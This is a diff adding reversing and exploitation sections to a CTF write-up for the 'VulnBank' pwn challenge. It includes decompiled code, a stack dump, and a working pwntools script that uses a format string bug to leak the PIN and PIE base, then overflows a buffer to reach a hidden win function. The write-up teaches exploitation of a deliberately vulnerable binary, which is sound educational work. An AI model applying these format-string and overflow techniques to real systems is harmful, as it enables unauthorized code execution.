@@ -20,7 +20,7 @@ This writeup covers all pwn challenges from NahamCon Winter CTF 2025. The event 
 
 #### Challenge Information
 - **Difficulty**: Medium
-- **First Blood**: true
+- **First Blood**: :blood:
 
 VulnBank requires chaining multiple vulnerabilities to achieve code execution. The exploit path involves:
 
@@ -30,7 +30,7 @@ VulnBank requires chaining multiple vulnerabilities to achieve code execution. T
 
 #### Attachments
 
-We are given a zip file which contains the necessary files needed to start the challenge + the challenge executable itself.
+We are given a zip file which contains the necessary files needed to start the challenge.
 
 ```bash
  ~/Desktop/CTF/NahamconWinter25/VulnBank ❯ zipinfo vuln_bank
@@ -110,6 +110,8 @@ vulnbank: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically l
     PIE:        PIE enabled
 ```
 
+We are working with a *x86-64* binary which is *dynamically linked* and *stripped*.
+
 All protections except *Stack Canary* are enabled on this binary.
 
 Running it to get an overview of its behaviour:
@@ -168,4 +170,625 @@ So it expects a 6 digits pin, and we have only 3 trials, we can make an assumpti
 
 In order to confirm that and identify the vulnerabiities, we need to reverse engineer it.
 
-#### Reversing
+#### Reversing 1
+
+Here's the main function:
+
+```c
+__int64 __fastcall main(int a1, char **a2, char **a3)
+{
+  setvbuf(stdin, 0LL, 2, 0LL);
+  setvbuf(stdout, 0LL, 2, 0LL);
+  setvbuf(stderr, 0LL, 2, 0LL);
+  show_banner();
+  if ( (unsigned int)validate_pin() )
+  {
+    sub_19DD();
+    puts(byte_24C9);
+    puts("Session ended.");
+  }
+  return 0LL;
+}
+```
+
+So it disables buffering on *stdin, stdout, stderr*.
+
+After that it prints the *banner* and calls the function which handles receiving & validating the pin.
+
+```c
+__int64 generate_random_pin()
+{
+  unsigned int buf; // [rsp+Ch] [rbp-14h] BYREF
+  ssize_t v2; // [rsp+10h] [rbp-10h]
+  int fd; // [rsp+1Ch] [rbp-4h]
+
+  fd = open("/dev/urandom", 0);
+  if ( fd < 0 )
+  {
+    perror("open");
+    exit(1);
+  }
+  v2 = read(fd, &buf, 4uLL);
+  if ( v2 != 4 )
+  {
+    perror("read");
+    close(fd);
+    exit(1);
+  }
+  close(fd);
+  return buf % 0xDBBA0 + 100000;
+}
+
+__int64 validate_pin()
+{
+  char s[268]; // [rsp+0h] [rbp-130h] BYREF
+  int v2; // [rsp+10Ch] [rbp-24h]
+  size_t pin_len; // [rsp+110h] [rbp-20h]
+  char *v4; // [rsp+118h] [rbp-18h]
+  int v5; // [rsp+124h] [rbp-Ch]
+  unsigned int attempts; // [rsp+128h] [rbp-8h]
+  unsigned int random_pin; // [rsp+12Ch] [rbp-4h]
+
+  random_pin = 0;
+  attempts = 0;
+  v5 = 0;
+  show_prompt();
+  while ( 1 )
+  {
+    if ( attempts > 2 )
+    {
+      puts("Too many incorrect attempts.");
+      puts("Your card has been retained by this VulnBank terminal.");
+      puts("Please contact support.");
+      return 0LL;
+    }
+    printf("Enter 6 digit PIN: ");
+    fflush(stdout);
+    if ( !fgets(s, 256, stdin) )
+      return 0LL;
+    pin_len = strlen(s);
+    if ( pin_len && s[pin_len - 1] == 10 )
+      s[pin_len - 1] = 0;
+    if ( v5 || attempts )
+    {
+      if ( !v5 )
+      {
+        random_pin = generate_random_pin();
+        v5 = 1;
+      }
+      printf(s, random_pin);
+      puts(byte_24C9);
+    }
+    else
+    {
+      printf(s);
+      puts(byte_24C9);
+      random_pin = generate_random_pin();
+      v5 = 1;
+    }
+    if ( !s[0] )
+    {
+      puts("Empty input is not a valid PIN.");
+      ++attempts;
+      goto LABEL_22;
+    }
+    v2 = atoi(s);
+    if ( v2 == random_pin )
+    {
+      if ( attempts )
+        break;
+    }
+    puts("Incorrect PIN.");
+    ++attempts;
+LABEL_22:
+    puts(byte_24C9);
+  }
+  puts(byte_24C9);
+  printf("Welcome back, VulnBank customer #%06u.\n", random_pin % 0xF4240);
+  puts(byte_24C9);
+  v4 = getenv("FLAG1");
+  if ( !v4 || !*v4 )
+    v4 = "flag{now_repeat_against_remote_server}";
+  printf("Authentication flag: %s\n", v4);
+  return 1LL;
+}
+```
+
+- It initializes the *pin & attempt* to null
+- It enters a *while loop* and once *attempt* is greater than *2*, it breaks
+- It receives the *PIN* and null terminates the string
+- If *v5* or *attempts* isn't null it enters another block of code which does this:
+    - If *v5* is null, it generates a new random pin and updates *v5* to *1*
+    - Else if the condition isn't met then it calls *printf* on the *pin* string
+- If any of the condition isn't meet (v5 and attempts are zero) it calls *printf* on the *pin* string then generates a random pin
+- If the first byte of the string is null, it goes to the start of the while loop
+- Our pin string is converted to an integer and compared with the generated pin, if it matches and attempts isn't null it breaks out of the loop else it prints the error message and increments attempts by 1
+- Outside the while loop, it reads the environment variable *FLAG1* and prints it out
+
+So in order to get the first flag we simply need to get the correct pin which was randomly generated.
+
+#### Exploitation 1
+
+The vulnerability is a format string bug, when it prints the provided pin, it doesn't use a format specifier leading to this vuln.
+
+The goal is obvious:
+- Since we have 3 attempts
+- Use the first one to basically let the pin get initialized because we know that at the second stage it's going to reuse the first pin since *v5* isn't null.
+- Use the second stage to leak the pin
+- Third stage to bypass the check and get logged in
+
+One thing to note is also this:
+
+```c
+printf(s, random_pin);
+```
+
+We'll use this during the second stage to easily leak the *pin*
+
+Since *random_pin* is used as the second parameter, we can use the format specifier `%2$d` to leak the value in `edx`
+
+Here's the solve:
+
+```python
+def solve():
+
+    io.sendlineafter(b":", b"junk")
+    io.sendlineafter(b":", b"%2$d")
+    pin = io.recvline().split(b" ")[1]
+    pin = int(pin)
+    io.sendline(str(pin).encode())
+
+    io.interactive()
+```
+
+Running it works!
+
+```bash
+ ~/Desktop/CTF/NahamconWinter25/VulnBank/vuln_bank ❯ python3 solve.py
+[*] '/home/.../Desktop/CTF/NahamconWinter25/VulnBank/vuln_bank/vulnbank'
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+[+] Starting local process '/home/.../Desktop/CTF/NahamconWinter25/VulnBank/vuln_bank/vulnbank': pid 218277
+[*] Switching to interactive mode
+Incorrect PIN.
+
+Enter 6 digit PIN: 689344
+
+Welcome back, VulnBank customer
+
+Authentication flag: flag{now_repeat_against_remote_server}
+
+================================================================
+                         VULNBANK MAIN MENU                     
+================================================================
+Your balance, your choices, our slightly buzzing hardware.
+
+Current available balance: £1337
+
+  [1] View balance
+  [2] Deposit cash
+  [3] Withdraw cash
+  [4] View recent activity
+  [9] Eject card and exit
+
+Select option: 
+```
+
+Now we need to do the second part which is getting the *FLAG2*.
+
+#### Reversing 2
+
+Moving on to the next step, we now get authenticated and can reach the next function.
+
+Here's the decompilation:
+
+```c
+void vulnbank_portal()
+{
+  char s[128]; // [rsp+0h] [rbp-B0h] BYREF
+  __int64 v1; // [rsp+80h] [rbp-30h]
+  __int64 v2; // [rsp+88h] [rbp-28h]
+  int v3; // [rsp+94h] [rbp-1Ch]
+  size_t v4; // [rsp+98h] [rbp-18h]
+  int v5; // [rsp+A4h] [rbp-Ch]
+  __int64 v6; // [rsp+A8h] [rbp-8h]
+
+  v6 = 1337LL;
+  v5 = 1;
+  while ( v5 )
+  {
+    sub_13D9();
+    printf(aCurrentAvailab, v6);
+    puts(byte_24C9);
+    sub_143A();
+    if ( !fgets(s, 128, stdin) )
+      break;
+    v4 = strlen(s);
+    if ( v4 && s[v4 - 1] == 10 )
+      s[v4 - 1] = 0;
+    v3 = atoi(s);
+    switch ( v3 )
+    {
+      case 1:
+        puts(byte_24C9);
+        puts("----------------------------------------------------------------");
+        puts("                        ACCOUNT BALANCE                         ");
+        puts("----------------------------------------------------------------");
+        printf(aAvailableFunds, v6);
+        puts("Savings goal:    undefined.");
+        puts("Financial stress: high.");
+        puts("----------------------------------------------------------------");
+        break;
+      case 2:
+        puts(byte_24C9);
+        puts("----------------------------------------------------------------");
+        puts("                          DEPOSIT CASH                          ");
+        puts("----------------------------------------------------------------");
+        printf(aEnterAmountToD);
+        fflush(stdout);
+        if ( !fgets(s, 128, stdin) )
+          return;
+        v1 = strtol(s, 0LL, 10);
+        if ( v1 <= 0 )
+          goto LABEL_11;
+        v6 += v1;
+        printf(aDeposited, v1);
+        break;
+      case 3:
+        puts(byte_24C9);
+        puts("----------------------------------------------------------------");
+        puts("                          WITHDRAW CASH                         ");
+        puts("----------------------------------------------------------------");
+        printf(aEnterAmountToW);
+        fflush(stdout);
+        if ( !fgets(s, 128, stdin) )
+          return;
+        v2 = strtol(s, 0LL, 10);
+        if ( v2 <= 0 )
+        {
+LABEL_11:
+          puts("Invalid amount.");
+        }
+        else if ( v2 <= v6 )
+        {
+          v6 -= v2;
+          printf(aPleaseCollectY, v2);
+        }
+        else
+        {
+          puts("Transaction declined: insufficient funds.");
+        }
+        break;
+      case 4:
+        puts(byte_24C9);
+        puts("----------------------------------------------------------------");
+        puts("                         RECENT ACTIVITY                        ");
+        puts("----------------------------------------------------------------");
+        puts(a1ContactlessPa);
+        puts(a2OnlinePurchas);
+        puts(a3CashWithdrawa);
+        puts("----------------------------------------------------------------");
+        break;
+      default:
+        if ( v3 )
+        {
+          if ( v3 == 9 )
+          {
+            puts(byte_24C9);
+            puts("Ejecting card...");
+            puts("Please take your card.");
+            puts("Thank you for using VulnBank.");
+            v5 = 0;
+          }
+          else
+          {
+            puts(byte_24C9);
+            puts("Unrecognized selection. The keypad beeps in confusion.");
+          }
+        }
+        else
+        {
+          sub_1659();
+        }
+        break;
+    }
+  }
+}
+```
+
+This function really doesn't do much and here's the important thing to work on:
+
+```c
+      default:
+        if ( v3 )
+        {
+          if ( v3 == 9 )
+          {
+            puts(byte_24C9);
+            puts("Ejecting card...");
+            puts("Please take your card.");
+            puts("Thank you for using VulnBank.");
+            v5 = 0;
+          }
+          else
+          {
+            puts(byte_24C9);
+            puts("Unrecognized selection. The keypad beeps in confusion.");
+          }
+        }
+        else
+        {
+          sub_1659();
+        }
+        b
+```
+
+Basically if *v3* which is the choice we provided is zero it calls the function *sub_1659*
+
+There's no switch case that handles *0*, looking at the decompilation of the function we get this:
+
+```c
+int sub_1659()
+{
+  _BYTE buf[72]; // [rsp+0h] [rbp-50h] BYREF
+  ssize_t v2; // [rsp+48h] [rbp-8h]
+
+  puts(byte_24C9);
+  puts("================================================================");
+  puts("                     VULNBANK SERVICE TERMINAL                  ");
+  puts("================================================================");
+  puts("Service channel open.");
+  puts("Processing maintenance request from keypad interface.");
+  puts(byte_24C9);
+  printf("maintenance> ");
+  fflush(stdout);
+  v2 = read(0, buf, 0x80uLL);
+  if ( v2 <= 0 )
+    return puts(byte_24C9);
+  if ( buf[v2 - 1] == 10 )
+    buf[v2 - 1] = 0;
+  return puts("Request queued for processing.");
+}
+```
+
+There's also a win function at address offset *0x1575* which has no reference call to it, hence our goal is here.
+
+```c
+void __noreturn sub_1575()
+{
+  const char *s; // [rsp+8h] [rbp-8h]
+
+  puts(byte_24C9);
+  puts("================================================================");
+  puts("                     VULNBANK MAINTENANCE MODE                  ");
+  puts("================================================================");
+  puts("Technician override accepted.");
+  puts("Bypassing customer safeguards, draining internal reserves...");
+  puts(byte_24C9);
+  s = getenv("FLAG2");
+  if ( !s || !*s )
+    s = "flag{now_repeat_against_remote_server}";
+  puts(s);
+  puts(byte_24C9);
+  puts("All internal cash reserves have been transferred to this session.");
+  puts("This incident will definitely not be logged. Probably.");
+  exit(0);
+}
+```
+
+#### Exploitation 2
+
+The vulnerability is yet again obvious, we have a buffer overflow because it reads in at most *0x80* bytes into a buffer that can only hold up *72* bytes of data leading to a *56* bytes overflow.
+
+With this overflow we simply need to overwrite the return address to that of the win function.
+
+In order to do that we need leaks, specifically pie leak.
+
+This is easy to accomplish using the initial format string bug discovered so here's the new strategy:
+- First stage leak pie
+- Second stage leak pin
+- Third stage authenticate
+- Exploit overflow to call the win function
+
+To leak pie we need the offset of where an elf section address is on the stack at the call to *printf*.
+
+Here's the stack layout:
+
+```bash
+$rcx+ 0x7ffddc956a30|+0x0000|+000: 0x0000007024353425 ('%45$p'?)
+      0x7ffddc956a38|+0x0008|+001: 0x00007feb34ef86ad <__syscall_cancel+0xd>  ->  0xf0003dd06348595a
+      0x7ffddc956a40|+0x0010|+002: 0x0000000000000001
+      0x7ffddc956a48|+0x0018|+003: 0x00007feb34ef86ad <__syscall_cancel+0xd>  ->  0xf0003dd06348595a
+      0x7ffddc956a50|+0x0020|+004: 0x0000000000000001
+      0x7ffddc956a58|+0x0028|+005: 0x00007feb34f6d936 <write+0x16>  ->  0x441f0fc318c48348
+      0x7ffddc956a60|+0x0030|+006: 0x0000000000000001
+      0x7ffddc956a68|+0x0038|+007: 0x00007feb34f6d936 <write+0x16>  ->  0x441f0fc318c48348
+      0x7ffddc956a70|+0x0040|+008: 0x0000000000000001
+      0x7ffddc956a78|+0x0048|+009: 0x00007feb34ef45f5 <_IO_file_write+0x25>  ->  0xc329482678c08548
+      0x7ffddc956a80|+0x0050|+010: 0x0000000000000002
+      0x7ffddc956a88|+0x0058|+011: 0x00007feb34ef45f5 <_IO_file_write+0x25>  ->  0xc329482678c08548
+      0x7ffddc956a90|+0x0060|+012: 0x00007feb3504efd0 <_IO_file_jumps>  ->  0x0000000000000000
+      0x7ffddc956a98|+0x0068|+013: 0x00007feb350515c0 <_IO_2_1_stdout_>  ->  0x00000000fbad2887
+      0x7ffddc956aa0|+0x0070|+014: 0x00007feb3504efd0 <_IO_file_jumps>  ->  0x0000000000000000
+      0x7ffddc956aa8|+0x0078|+015: 0x00007feb35051643 <_IO_2_1_stdout_+0x83>  ->  0x0527b0000000000a
+      0x7ffddc956ab0|+0x0080|+016: 0x0000000000000001
+      0x7ffddc956ab8|+0x0088|+017: 0x00007feb34ef28d2 <new_do_write+0x52>  ->  0x4800000080bbb70f
+      0x7ffddc956ac0|+0x0090|+018: 0x0000000000000001
+      0x7ffddc956ac8|+0x0098|+019: 0x000000000000000a
+      0x7ffddc956ad0|+0x00a0|+020: 0x00007feb350515c0 <_IO_2_1_stdout_>  ->  0x00000000fbad2887
+      0x7ffddc956ad8|+0x00a8|+021: 0x000056272cf87020 <stdout>  ->  0x00007feb350515c0 <_IO_2_1_stdout_>  ->  0x00000000fbad2887
+      0x7ffddc956ae0|+0x00b0|+022: 0x00007feb3504efd0 <_IO_file_jumps>  ->  0x0000000000000000
+      0x7ffddc956ae8|+0x00b8|+023: 0x00007feb34ef36f9 <_IO_do_write+0x19>  ->  0x0fc0950f5bc33948
+      0x7ffddc956af0|+0x00c0|+024: 0x00007feb350515c0 <_IO_2_1_stdout_>  ->  0x00000000fbad2887
+      0x7ffddc956af8|+0x00c8|+025: 0x00007feb34ef3c33 <_IO_file_overflow+0x103>  ->  0xffff53850ffff883
+      0x7ffddc956b00|+0x00d0|+026: 0x0000000000000000
+      0x7ffddc956b08|+0x00d8|+027: 0x000056272cf844c9  ->  0x5000000000000000
+      0x7ffddc956b10|+0x00e0|+028: 0x00007feb350515c0 <_IO_2_1_stdout_>  ->  0x00000000fbad2887
+      0x7ffddc956b18|+0x00e8|+029: 0x00007feb34ee977a <puts+0x1da>  ->  0xfffeb6850ffff883
+      0x7ffddc956b20|+0x00f0|+030: 0x00007feb350514e0 <_IO_2_1_stderr_>  ->  0x00000000fbad2087
+      0x7ffddc956b28|+0x00f8|+031: 0x00007feb34ee9e70 <setvbuf+0x120>  ->  0x1945038b01f88348
+      0x7ffddc956b30|+0x0100|+032: 0x00007ffddc956c88  ->  0x00007ffddc957f92  ->  0x616d2f656d6f682f '/home/../Desktop/CTF/NahamconWinter25/VulnBank/vuln_bank/vulnb[...]'  <-  $rbx
+      0x7ffddc956b38|+0x0108|+033: 0x00007ffddc956b60  ->  0x00007ffddc956b70  ->  0x0000000000000001  <-  $rbp
+      0x7ffddc956b40|+0x0110|+034: 0x0000000000000006
+      0x7ffddc956b48|+0x0118|+035: 0x00007ffddc956c98  ->  0x00007ffddc957fd6  ->  0x424746524f4c4f43 'COLORFGBG=15;0'  <-  $r13
+      0x7ffddc956b50|+0x0120|+036: 0x00000000350b7000
+      0x7ffddc956b58|+0x0128|+037: 0x0000000000000000
+$rbp  0x7ffddc956b60|+0x0130|+038: 0x00007ffddc956b70  ->  0x0000000000000001
+      0x7ffddc956b68|+0x0138|+039: 0x000056272cf83ebb  ->  0x000000b80775c085  <-  retaddr[1]
+      0x7ffddc956b70|+0x0140|+040: 0x0000000000000001
+      0x7ffddc956b78|+0x0148|+041: 0x00007feb34e92ca8 <__libc_start_call_main+0x78>  ->  0xe800018691e8c789  <-  retaddr[2]
+      0x7ffddc956b80|+0x0150|+042: 0x00007ffddc956c70  ->  0x00007ffddc956c78  ->  0x0000000000000038
+      0x7ffddc956b88|+0x0158|+043: 0x000056272cf83e49  ->  0xdc058b48e5894855
+      0x7ffddc956b90|+0x0160|+044: 0x000000012cf82040
+      0x7ffddc956b98|+0x0168|+045: 0x00007ffddc956c88  ->  0x00007ffddc957f92  ->  0x616d2f656d6f682f '/home/.../Desktop/CTF/NahamconWinter25/VulnBank/vuln_bank/vulnb[...]'  <-  $rbx
+      0x7ffddc956ba0|+0x0170|+046: 0x00007ffddc956c88  ->  0x00007ffddc957f92  ->  0x616d2f656d6f682f '/home/.../Desktop/CTF/NahamconWinter25/VulnBank/vuln_bank/vulnb[...]'  <-  $rbx
+      0x7ffddc956ba8|+0x0178|+047: 0x9c641817c2f4492e
+      0x7ffddc956bb0|+0x0180|+048: 0x0000000000000000
+      0x7ffddc956bb8|+0x0188|+049: 0x00007ffddc956c98  ->  0x00007ffddc957fd6  ->  0x424746524f4c4f43 'COLORFGBG=15;0'  <-  $r13
+      0x7ffddc956bc0|+0x0190|+050: 0x00007feb350b7000 <_rtld_global>  ->  0x00007feb350b8310  ->  0x000056272cf82000  ->  ...  <-  $r14
+      0x7ffddc956bc8|+0x0198|+051: 0x000056272cf86d58  ->  0x000056272cf831c0  ->  0x3e7d3d80fa1e0ff3  <-  $r15
+      0x7ffddc956bd0|+0x01a0|+052: 0x639fa13d15f6492e
+      0x7ffddc956bd8|+0x01a8|+053: 0x63b271c59a36492e
+      0x7ffddc956be0|+0x01b0|+054: 0x0000000000000000
+      0x7ffddc956be8|+0x01b8|+055: 0x0000000000000000
+      0x7ffddc956bf0|+0x01c0|+056: 0x0000000000000000
+/tmp/gef/gef_print-20251220-135105-ybn32pv1.txt
+```
+
+I opted for this address, as it's more reliable to leak the return address than some random pie address on the stack.
+
+```bash
+      0x7ffddc956b68|+0x0138|+039: 0x000056272cf83ebb  ->  0x000000b80775c085  <-  retaddr[1]
+```
+
+With this we can calculate the base address and exploit the overflow!
+
+Here's my solve script:
+
+```python
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwn import *
+
+exe = context.binary = ELF('vulnbank')
+context.terminal = ['xfce4-terminal', '--title=GDB', '--zoom=0', '--geometry=128x50+1100+0', '-e']
+context.log_level = 'info'
+
+def start(argv=[], *a, **kw):
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE: 
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+gdbscript = '''
+init-gef
+brva 0x1823
+continue
+'''.format(**locals())
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+
+def init():
+    global io
+
+    io = start()
+
+def solve():
+
+    io.sendlineafter(b":", b"%45$p")
+    leak = io.recvline().split(b" ")[1]
+    exe.address = int(leak, 16) - 0x1ebb
+    info("elf base: %#x", exe.address)
+
+    io.sendlineafter(b":", b"%2$d")
+    pin = io.recvline().split(b" ")[1]
+    pin = int(pin)
+    io.sendline(str(pin).encode())
+
+    io.sendlineafter(b":", b"0")
+    offset = 72+8+8
+    payload = flat({
+        offset: [
+            exe.address + 0x001575
+        ]
+    })
+
+    io.sendline(payload)
+    io.interactive()
+
+
+def main():
+    
+    init()
+    solve()
+    
+
+if __name__ == '__main__':
+    main()
+
+```
+
+Running it works!
+
+```bash
+ ~/Desktop/CTF/NahamconWinter25/VulnBank/vuln_bank ❯ python3 solve.py
+[*] '/home/.../Desktop/CTF/NahamconWinter25/VulnBank/vuln_bank/vulnbank'
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+[+] Starting local process '/home/.../Desktop/CTF/NahamconWinter25/VulnBank/vuln_bank/vulnbank': pid 259469
+[*] elf base: 0x55b6b5302000
+[*] Switching to interactive mode
+ [*] Process '/home/.../Desktop/CTF/NahamconWinter25/VulnBank/vuln_bank/vulnbank' stopped with exit code 0 (pid 259469)
+927478
+
+Welcome back, VulnBank customer
+
+Authentication flag: flag{now_repeat_against_remote_server}
+
+================================================================
+                         VULNBANK MAIN MENU                     
+================================================================
+Your balance, your choices, our slightly buzzing hardware.
+
+Current available balance: £1337
+
+  [1] View balance
+  [2] Deposit cash
+  [3] Withdraw cash
+  [4] View recent activity
+  [9] Eject card and exit
+
+Select option: 
+================================================================
+                     VULNBANK SERVICE TERMINAL                  
+================================================================
+Service channel open.
+Processing maintenance request from keypad interface.
+
+maintenance> Request queued for processing.
+
+================================================================
+                     VULNBANK MAINTENANCE MODE                  
+================================================================
+Technician override accepted.
+Bypassing customer safeguards, draining internal reserves...
+
+flag{now_repeat_against_remote_server}
+
+All internal cash reserves have been transferred to this session.
+This incident will definitely not be logged. Probably.
+[*] Got EOF while reading in interactive
+```
+
+And we get the flag 😜
+
